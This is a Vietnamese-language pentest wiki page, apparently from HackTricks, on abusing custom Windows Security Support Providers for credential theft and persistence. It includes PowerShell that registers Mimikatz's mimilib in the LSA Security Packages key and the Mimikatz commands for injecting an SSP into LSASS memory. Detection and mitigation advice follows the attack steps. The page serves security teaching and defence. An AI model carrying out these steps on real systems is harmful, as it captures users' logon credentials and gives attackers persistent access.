# Custom Security Support Providers

{{#include ../../banners/hacktricks-training.md}}

[Security Support Providers (SSPs)](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi) là các gói bảo mật dựa trên DLL, được Local Security Authority (LSA) tải. Windows đăng ký các DLL SSP/AP tùy chỉnh thông qua giá trị `REG_MULTI_SZ` `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` và tải các gói đã đăng ký khi hệ thống khởi động.<sup>[[1]](#references)</sup>

Vì SSP chạy trong LSA và có thể tiếp nhận thông tin xác thực, đối thủ có thể lạm dụng một gói độc hại để truy cập thông tin xác thực và duy trì quyền truy cập. MITRE theo dõi hành vi này dưới mã T1547.005.<sup>[[2]](#references)</sup>

## Mimikatz `mimilib`

Mimikatz có `mimilib.dll`, triển khai một SSP ghi lại thông tin xác thực được xử lý sau khi DLL được tải. Trong môi trường lab được cấp phép, hãy đặt DLL phù hợp với kiến trúc của mục tiêu vào `C:\Windows\System32`, sau đó kiểm tra danh sách gói hiện tại trước khi thay đổi danh sách này.<sup>[[2]](#references)[[3]](#references)</sup>

```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$packages = (Get-ItemProperty -Path $lsaPath -Name 'Security Packages').'Security Packages'
$packages
```

Một giá trị hiện có thường chứa các package như `kerberos`, `msv1_0`, `schannel`, `wdigest`, `tspkg` và `pku2u`. Hãy giữ nguyên mọi mục hiện có khi thêm package tùy chỉnh.<sup>[[1]](#references)</sup>

Thêm `mimilib` vào cuối mà không thay thế các package hiện có:

```powershell
if ($packages -notcontains 'mimilib') {
    Set-ItemProperty -Path $lsaPath -Name 'Security Packages' -Value ($packages + 'mimilib')
}
```

Sau khi khởi động lại, gói này được nạp vào LSA và thông tin xác thực được thu thập sau đó sẽ được triển khai này ghi vào `C:\Windows\System32\kiwissp.log`.<sup>[[2]](#references)[[3]](#references)</sup>

## Nạp vào bộ nhớ

Mimikatz cũng có thể inject phần triển khai SSP của nó vào tiến trình LSASS hiện tại:<sup>[[3]](#references)</sup>

```text
privilege::debug
misc::memssp
```

Phương pháp này không tồn tại sau khi khởi động lại.<sup>[[2]](#references)[[3]](#references)</sup>

## Detection and Mitigation

Theo dõi các thay đổi đối với `...\Lsa\Security Packages` và các DLL được tải bất thường vào `lsass.exe`. Sự kiện bảo mật 4657 chỉ ghi nhận việc sửa đổi **giá trị** registry khi đã cấu hình chính sách Audit Registry và SACL liên quan.<sup>[[2]](#references)[[4]](#references)</sup>

Khi tương thích, hãy bật tính năng bảo vệ LSA bổ sung và điều tra các DLL SSP không được ký hoặc không mong đợi. Microsoft mô tả cụ thể tính năng bảo vệ LSA là một biện pháp kiểm soát chống lại việc chèn mã có thể làm lộ thông tin xác thực.<sup>[[5]](#references)</sup>

## References

- [1] [Microsoft Learn - Đăng ký DLL SSP/AP](https://learn.microsoft.com/en-us/windows/win32/secauthn/registering-ssp-ap-dlls)
- [2] [MITRE ATT&CK T1547.005 - Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
- [3] [Kho lưu trữ Mimikatz - `mimilib`](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
- [4] [Microsoft Learn - Sự kiện bảo mật 4657](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
- [5] [Microsoft Learn - Cấu hình tính năng bảo vệ LSA bổ sung](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
